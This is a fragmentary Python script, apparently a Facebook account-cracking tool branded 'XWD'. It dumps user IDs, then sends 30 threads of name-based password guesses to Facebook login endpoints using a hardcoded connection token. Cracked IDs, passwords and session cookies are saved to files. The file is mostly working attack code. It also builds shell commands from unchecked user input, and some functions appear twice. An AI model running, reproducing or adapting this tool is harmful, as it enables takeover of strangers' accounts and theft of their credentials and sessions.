...
from concurrent.futures import ThreadPoolExecutor as manisxwd
from string import * 
...
\033[1;37m    ######      ######     ########  
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Manis xwd
\033[1;37m Facebook:            Man is
\033[1;37m Github  :            Man is0
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back XWD Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XWD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [XWD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XWD_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [XWD-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/XWD_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XWD] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[XWD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[XWD] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [XWD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/XWD_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with manisxwd(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def login():
    ...
    try:
        ...
        act = re.search("act=(.*?)&kg",str(fact)).group(1)
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/XWD.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/XWD.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    os.system('touch ' +manis)
    os.system('sort -r '+xwd+' | uniq > '+manis)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + xwd )
    print(47*'-')
    print("File Saved To :" + manis )
    print(47*'-')
    input(f"{S} Press Enter To Back XWD Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/XWD.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    xwd = input('Put File Name:')
    print(" ")
    manis = input('Saving Put File Name:')
    os.system('touch ' +manis)
    os.system('sort -r '+xwd+' | uniq > '+manis)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + xwd )
    print("New File Saved:" + manis )
    print(47*'-')
    input(f"{S} Press Enter To Back XWD Menu ")
    XWD(allkey)       
